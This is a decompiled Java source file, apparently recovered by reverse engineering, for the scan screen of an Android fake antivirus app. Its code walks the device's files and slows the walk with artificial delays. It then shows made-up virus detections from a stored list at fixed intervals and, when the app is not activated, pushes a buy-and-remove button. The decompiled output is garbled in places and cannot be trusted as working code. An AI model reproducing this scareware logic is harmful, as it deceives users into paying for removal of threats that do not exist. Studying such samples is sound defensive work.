package com.example.androiddefender2;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.drawable.Drawable;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.TableLayout;
import android.widget.TableRow;
import android.widget.TextView;
import android.widget.Toast;
import com.worker.androiddefender2.SystemFunctions;
import com.worker.helper.HelperFactory;
import com.worker.helper.Tables.ScanHistory;
import java.io.File;
import java.sql.SQLException;
import java.text.DateFormat;
import java.util.ArrayList;
import java.util.Date;
import system.AppSingleton;
import system.ThreadControl;
import system.VirusObject;

public class SingleScanActivity extends Activity {
  private boolean PauseScan = false;
  
  private boolean ScanApp;
  
  private boolean ScanSD;
  
  public Button btnByAndRemove;
  
  public Button btnRepeat;
  
  private boolean firstScan = false;
  
  private getScanInfo loader = null;
  
  public ProgressBar progressBar;
  
  public boolean sendToMain = false;
  
  ThreadControl tControl = new ThreadControl();
  
  public TextView tvCurFile;
  
  public TextView tvFilesCount;
  
  public TextView tvProcentPr;
  
  public TextView txtFinalVirusView;
  
  public TextView txtStatusScan;
  
  public void addRow(String paramString) {
    TableLayout tableLayout = (TableLayout)findViewById(2131296328);
    TableRow tableRow = (TableRow)((LayoutInflater)getSystemService("layout_inflater")).inflate(2130903061, null);
    ImageView imageView = (ImageView)tableRow.findViewById(2131296369);
    TextView textView = (TextView)tableRow.findViewById(2131296370);
    if (!(AppSingleton.getInstance()).activaten) {
      imageView.setImageResource(2130837528);
      textView.setTextColor(Color.parseColor("#ff0000"));
      textView.setText(2131099723);
    } else {
      imageView.setImageResource(2130837557);
      textView.setTextColor(Color.parseColor("#78c90a"));
      textView.setText(2131099722);
    } 
    ((TextView)tableRow.getChildAt(1)).setText(paramString);
    tableLayout.addView((View)tableRow);
  }
  
  public void btnByAndRemove_Click(View paramView) {
    boolean bool = false;
    if ((AppSingleton.getInstance()).activaten) {
      Button button = (Button)findViewById(2131296332);
      if (this.PauseScan) {
        this.tControl.resume();
        button.setText(2131099729);
      } else {
        this.tControl.pause();
        button.setText(2131099777);
      } 
      if (!this.PauseScan)
        bool = true; 
      this.PauseScan = bool;
      return;
    } 
    if (this.loader == null || this.loader.getStatus().equals(AsyncTask.Status.FINISHED)) {
      (DefenderApplication.getInstance()).tabHost.setCurrentTab(4);
      finish();
      return;
    } 
    Toast.makeText(getApplicationContext(), 2131099752, 0).show();
  }
  
  public void btnRepeat_Click(View paramView) {
    try {
      if (this.loader == null || this.loader.getStatus().equals(AsyncTask.Status.FINISHED)) {
        this.tControl.cancel();
        (DefenderApplication.getInstance()).tabHost.setCurrentTab(0);
        finish();
        return;
      } 
      Toast.makeText(getApplicationContext(), 2131099752, 0).show();
    } catch (Exception exception) {
      Toast.makeText(getApplicationContext(), exception.getMessage(), 1).show();
    } 
  }
  
  public void onBackPressed() {
    if (this.loader == null || this.loader.getStatus().equals(AsyncTask.Status.FINISHED)) {
      this.tControl.cancel();
      (DefenderApplication.getInstance()).tabHost.setCurrentTab(0);
      finish();
      return;
    } 
    Toast.makeText(getApplicationContext(), 2131099752, 0).show();
  }
  
  protected void onCreate(Bundle paramBundle) {
    super.onCreate(paramBundle);
    setContentView(2130903050);
    HelperFactory.setHelper(getApplicationContext());
    try {
      Drawable drawable;
      this.progressBar = (ProgressBar)findViewById(2131296323);
      this.tvCurFile = (TextView)findViewById(2131296324);
      this.tvFilesCount = (TextView)findViewById(2131296330);
      this.tvProcentPr = (TextView)findViewById(2131296331);
      this.txtStatusScan = (TextView)findViewById(2131296294);
      this.txtFinalVirusView = (TextView)findViewById(2131296329);
      this.progressBar.setProgress(0);
      this.loader = null;
      Intent intent = getIntent();
      this.ScanApp = intent.getBooleanExtra("scanApplication", false);
      this.ScanSD = intent.getBooleanExtra("scanSDCard", false);
      this.btnByAndRemove = (Button)findViewById(2131296332);
      this.btnRepeat = (Button)findViewById(2131296333);
      TextView textView = (TextView)findViewById(2131296327);
      if (!(AppSingleton.getInstance()).activaten) {
        this.progressBar.setProgressDrawable(getResources().getDrawable(2130837566));
        textView.setVisibility(0);
        drawable = getApplicationContext().getResources().getDrawable(2130837557);
        this.btnByAndRemove.setCompoundDrawablesWithIntrinsicBounds(drawable, null, null, null);
        this.btnByAndRemove.setText(2131099698);
        this.btnRepeat.setText(2131099699);
        ((ViewGroup.MarginLayoutParams)((ImageView)findViewById(2131296326)).getLayoutParams()).setMargins(0, 0, 0, 25);
        drawable.invalidateSelf();
      } else {
        this.progressBar.setProgressDrawable(getResources().getDrawable(2130837565));
        drawable.setVisibility(4);
        this.btnByAndRemove.setCompoundDrawablesWithIntrinsicBounds(null, null, null, null);
        this.btnByAndRemove.setText(2131099698);
        this.btnByAndRemove.setText(2131099729);
        this.btnRepeat.setText(2131099724);
        ((ViewGroup.MarginLayoutParams)((ImageView)findViewById(2131296326)).getLayoutParams()).setMargins(0, 0, 0, 15);
        if ((DefenderApplication.getInstance()).indexesVr.size() > 0) {
          this.btnByAndRemove.setVisibility(4);
          this.btnRepeat.setText(2131099776);
          drawable = getApplicationContext().getResources().getDrawable(2130837557);
          this.btnRepeat.setCompoundDrawablesWithIntrinsicBounds(drawable, null, null, null);
          this.firstScan = true;
        } 
      } 
      this.sendToMain = getIntent().getBooleanExtra("sendToMain", false);
      startLoading();
    } catch (Exception exception) {}
  }
  
  public boolean onCreateOptionsMenu(Menu paramMenu) {
    getMenuInflater().inflate(2131230732, paramMenu);
    return true;
  }
  
  public void onDestroy() {
    HelperFactory.releaseHelper();
    super.onDestroy();
  }
  
  public void startLoading() {
    if (this.loader == null || this.loader.getStatus().equals(AsyncTask.Status.FINISHED))
      try {
        (DefenderApplication.getInstance()).skaner_worker = true;
        if (!(AppSingleton.getInstance()).activaten) {
          this.btnByAndRemove.setEnabled(false);
          this.btnRepeat.setEnabled(false);
        } 
        getScanInfo getScanInfo1 = new getScanInfo();
        this(this);
        this.loader = getScanInfo1;
        File file = Environment.getRootDirectory();
        this.loader.execute((Object[])new File[] { file });
      } catch (Exception exception) {
        Toast.makeText((Context)this, exception.getMessage(), 0).show();
      }  
  }
  
  class getScanInfo extends AsyncTask<File, Integer, Void> {
    ArrayList<String> arlist = null;
    
    private int count_files = 0;
    
    private String cur_status;
    
    private int current_file = 0;
    
    private String file_name;
    
    private boolean prepare_count = false;
    
    private int progr = 0;
    
    private int step_memory = 0;
    
    private int virus_count_rand = 0;
    
    private int virus_current_index = 0;
    
    protected Void doInBackground(File... param1VarArgs) {
      try {
        if (this.count_files == 0) {
          this.prepare_count = true;
          this.cur_status = SingleScanActivity.this.getResources().getString(2131099739);
          this.count_files = getCountFiles(Environment.getRootDirectory());
          if (SingleScanActivity.this.ScanSD) {
            int i = getCountFiles(Environment.getExternalStorageDirectory());
            this.count_files += i;
          } 
          this.prepare_count = false;
        } 
        if ((DefenderApplication.getInstance()).indexesVr != null && (DefenderApplication.getInstance()).indexesVr.size() > 0) {
          this.virus_count_rand = (DefenderApplication.getInstance()).countViruses;
          this.step_memory = Math.round((this.count_files / this.virus_count_rand));
        } 
        this.cur_status = SingleScanActivity.this.getResources().getString(2131099740);
        getListFilesSDCard(Environment.getRootDirectory());
        if (SingleScanActivity.this.ScanSD) {
          this.cur_status = SingleScanActivity.this.getResources().getString(2131099741);
          getListFilesSDCard(Environment.getExternalStorageDirectory());
        } 
      } catch (Exception exception) {}
      return null;
    }
    
    public int getCountFiles(File param1File) {
      // Byte code:
      //   0: aload_1
      //   1: ifnonnull -> 8
      //   4: iconst_0
      //   5: istore_2
      //   6: iload_2
      //   7: ireturn
      //   8: iconst_0
      //   9: istore_3
      //   10: aload_1
      //   11: invokevirtual listFiles : ()[Ljava/io/File;
      //   14: astore_1
      //   15: aload_1
      //   16: arraylength
      //   17: istore #4
      //   19: iconst_0
      //   20: istore #5
      //   22: iload_3
      //   23: istore_2
      //   24: iload #5
      //   26: iload #4
      //   28: if_icmpge -> 6
      //   31: aload_1
      //   32: iload #5
      //   34: aaload
      //   35: astore #6
      //   37: iload_3
      //   38: istore_2
      //   39: aload #6
      //   41: invokevirtual canRead : ()Z
      //   44: ifeq -> 104
      //   47: aload #6
      //   49: invokevirtual isDirectory : ()Z
      //   52: ifeq -> 133
      //   55: iload_3
      //   56: istore_2
      //   57: aload #6
      //   59: invokevirtual getAbsolutePath : ()Ljava/lang/String;
      //   62: ldc '.android_secure'
      //   64: invokevirtual endsWith : (Ljava/lang/String;)Z
      //   67: ifne -> 6
      //   70: aload #6
      //   72: invokevirtual getAbsolutePath : ()Ljava/lang/String;
      //   75: ldc 'DCIM'
      //   77: invokevirtual endsWith : (Ljava/lang/String;)Z
      //   80: ifeq -> 95
      //   83: iload_3
      //   84: istore #7
      //   86: iinc #5, 1
      //   89: iload #7
      //   91: istore_3
      //   92: goto -> 22
      //   95: iload_3
      //   96: aload_0
      //   97: aload #6
      //   99: invokevirtual getCountFiles : (Ljava/io/File;)I
      //   102: iadd
      //   103: istore_2
      //   104: aload_0
      //   105: getfield this$0 : Lcom/example/androiddefender2/SingleScanActivity;
      //   108: getfield tControl : Lsystem/ThreadControl;
      //   111: invokevirtual waitIfPaused : ()V
      //   114: iload_2
      //   115: istore #7
      //   117: aload_0
      //   118: getfield this$0 : Lcom/example/androiddefender2/SingleScanActivity;
      //   121: getfield tControl : Lsystem/ThreadControl;
      //   124: invokevirtual isCancelled : ()Z
      //   127: ifeq -> 86
      //   130: goto -> 6
      //   133: iload_3
      //   134: istore #7
      //   136: aload #6
      //   138: invokevirtual getAbsolutePath : ()Ljava/lang/String;
      //   141: ldc '.sbf'
      //   143: invokevirtual endsWith : (Ljava/lang/String;)Z
      //   146: ifne -> 86
      //   149: iload_3
      //   150: iconst_1
      //   151: iadd
      //   152: istore_2
      //   153: aload_0
      //   154: aload #6
      //   156: invokevirtual getName : ()Ljava/lang/String;
      //   159: invokevirtual toString : ()Ljava/lang/String;
      //   162: putfield file_name : Ljava/lang/String;
      //   165: aload_0
      //   166: iconst_1
      //   167: anewarray java/lang/Integer
      //   170: dup
      //   171: iconst_0
      //   172: iconst_0
      //   173: invokestatic valueOf : (I)Ljava/lang/Integer;
      //   176: aastore
      //   177: invokevirtual publishProgress : ([Ljava/lang/Object;)V
      //   180: goto -> 104
      //   183: astore_1
      //   184: iconst_0
      //   185: istore_2
      //   186: goto -> 6
      // Exception table:
      //   from	to	target	type
      //   10	19	183	java/lang/Exception
      //   39	55	183	java/lang/Exception
      //   57	83	183	java/lang/Exception
      //   95	104	183	java/lang/Exception
      //   104	114	183	java/lang/Exception
      //   117	130	183	java/lang/Exception
      //   136	149	183	java/lang/Exception
      //   153	180	183	java/lang/Exception
    }
    
    public ArrayList<String> getListFilesSDCard(File param1File) {
      try {
        if (this.arlist == null) {
          ArrayList<String> arrayList = new ArrayList();
          this();
          this.arlist = arrayList;
        } 
        File[] arrayOfFile = param1File.listFiles();
        int i = arrayOfFile.length;
        for (byte b = 0;; b++) {
          if (b < i) {
            File file = arrayOfFile[b];
            try {
              if (file.canRead())
                if (file.isDirectory()) {
                  boolean bool = file.getAbsolutePath().endsWith(".android_secure");
                  if (bool)
                    return this.arlist; 
                  if (file.getAbsolutePath().endsWith("DCIM"))
                    continue; 
                  getListFilesSDCard(file);
                } else if (!file.getAbsolutePath().endsWith(".sbf")) {
                  this.arlist.add(file.getAbsolutePath());
                  double d = this.count_files / 100.0D;
                  this.progr = (int)Math.ceil(this.arlist.size() / d);
                  publishProgress((Object[])new Integer[] { Integer.valueOf(this.progr) });
                  this.file_name = file.getName().toString();
                  this.current_file++;
                } else {
                  continue;
                }  
              if (SingleScanActivity.this.getResources().getBoolean(2131034112))
                Thread.sleep(150L); 
              SingleScanActivity.this.tControl.waitIfPaused();
              if (SingleScanActivity.this.tControl.isCancelled())
                return this.arlist; 
            } catch (Exception exception) {}
            continue;
          } 
          return this.arlist;
        } 
      } catch (Exception exception) {}
      return this.arlist;
    }
    
    protected void onPostExecute(Void param1Void) {
      if (!(AppSingleton.getInstance()).activaten) {
        SingleScanActivity.this.txtFinalVirusView.setText(String.format(SingleScanActivity.this.getResources().getString(2131099737), new Object[] { Integer.valueOf(this.virus_count_rand) }) + " " + String.format(SingleScanActivity.this.getResources().getString(2131099738), new Object[] { Integer.valueOf(0) }));
        SingleScanActivity.this.btnByAndRemove.setEnabled(true);
      } else {
        if ((DefenderApplication.getInstance()).indexesVr.size() > 0) {
          SingleScanActivity.this.txtFinalVirusView.setText(String.format(SingleScanActivity.this.getResources().getString(2131099737), new Object[] { Integer.valueOf(this.virus_count_rand) }) + " " + String.format(SingleScanActivity.this.getResources().getString(2131099738), new Object[] { Integer.valueOf(this.virus_count_rand) }));
          if (this.progr >= 100)
            try {
              HelperFactory.getHelper().getVirusesIndexesDao().deleteAll();
              DefenderApplication defenderApplication = DefenderApplication.getInstance();
              ArrayList<Integer> arrayList = new ArrayList();
              this();
              defenderApplication.indexesVr = arrayList;
              (DefenderApplication.getInstance()).countViruses = 0;
            } catch (SQLException sQLException) {
              SystemFunctions.generateToastException(sQLException.getMessage());
            } catch (Exception exception) {
              SystemFunctions.generateToastException(exception.getMessage());
            }  
        } else {
          SingleScanActivity.this.txtFinalVirusView.setText(SingleScanActivity.this.getResources().getString(2131099736));
        } 
        SingleScanActivity.this.btnByAndRemove.setEnabled(false);
      } 
      SingleScanActivity.this.btnRepeat.setEnabled(true);
      if ((AppSingleton.getInstance()).activaten)
        SingleScanActivity.this.btnRepeat.setText(2131099776); 
      if (!(DefenderApplication.getInstance()).makeFirstScan) {
        (DefenderApplication.getInstance()).makeFirstScan = true;
        SingleScanActivity singleScanActivity = SingleScanActivity.this;
        DefenderApplication.getInstance();
        SharedPreferences.Editor editor = singleScanActivity.getSharedPreferences(DefenderApplication.APP_PREF, 0).edit();
        editor.putBoolean("makeFirstScan", true);
        editor.commit();
      } 
      if (SingleScanActivity.this.sendToMain)
        (DefenderApplication.getInstance()).tabHost.setCurrentTab(0); 
      (DefenderApplication.getInstance()).skaner_worker = false;
      try {
        DateFormat dateFormat = DateFormat.getDateTimeInstance();
        Date date1 = new Date();
        this();
        String str = dateFormat.format(date1);
        Date date2 = new Date();
        this();
        ScanHistory scanHistory = new ScanHistory();
        this();
        StringBuilder stringBuilder = new StringBuilder();
        this();
        scanHistory.setName(stringBuilder.append("Сканирование от ").append(str).toString());
        scanHistory.setScanDate(date2);
        HelperFactory.getHelper().getScanHistoryDAO().create(scanHistory);
      } catch (SQLException sQLException) {
        Toast.makeText(SingleScanActivity.this.getApplicationContext(), "Error: " + sQLException.getMessage(), 0).show();
      } 
    }
    
    protected void onProgressUpdate(Integer... param1VarArgs) {
      try {
        int i = param1VarArgs[0].intValue();
        SingleScanActivity.this.txtStatusScan.setText(this.cur_status);
        if (this.file_name != null) {
          String str;
          if (this.file_name.length() > 13) {
            StringBuilder stringBuilder = new StringBuilder();
            this();
            str = stringBuilder.append(this.file_name.substring(1, 5)).append("...").append(this.file_name.substring(this.file_name.length() - 5, this.file_name.length() - 1)).toString();
          } else {
            str = this.file_name;
          } 
          SingleScanActivity.this.tvCurFile.setText(str);
        } 
        if (!this.prepare_count) {
          SingleScanActivity.this.progressBar.setProgress(i);
          TextView textView = SingleScanActivity.this.tvFilesCount;
          StringBuilder stringBuilder = new StringBuilder();
          this();
          textView.setText(stringBuilder.append(this.current_file).append("/").append(this.count_files).toString());
          textView = SingleScanActivity.this.tvProcentPr;
          stringBuilder = new StringBuilder();
          this();
          textView.setText(stringBuilder.append(i).append("%").toString());
          if ((DefenderApplication.getInstance()).indexesVr != null && (DefenderApplication.getInstance()).indexesVr.size() > 0) {
            int j = Math.round((this.count_files / this.virus_count_rand));
            i = this.current_file;
            int k = this.step_memory;
            if (i >= k) {
              try {
                if ((DefenderApplication.getInstance()).indexesVr.size() > 0) {
                  VirusObject virusObject = SystemFunctions.getVirusByIndex(((Integer)(DefenderApplication.getInstance()).indexesVr.get(this.virus_current_index)).intValue() - 1);
                  SingleScanActivity.this.addRow(virusObject.getName());
                  this.step_memory += j;
                } 
              } catch (Exception exception) {}
            } else {
              return;
            } 
          } else {
            return;
          } 
        } else {
          return;
        } 
        this.virus_current_index++;
      } catch (Exception exception) {}
    }
  }
}


/* Location:              /home/fahim/Desktop/fake_av_reader-dex2jar.jar!/com/example/androiddefender2/SingleScanActivity.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */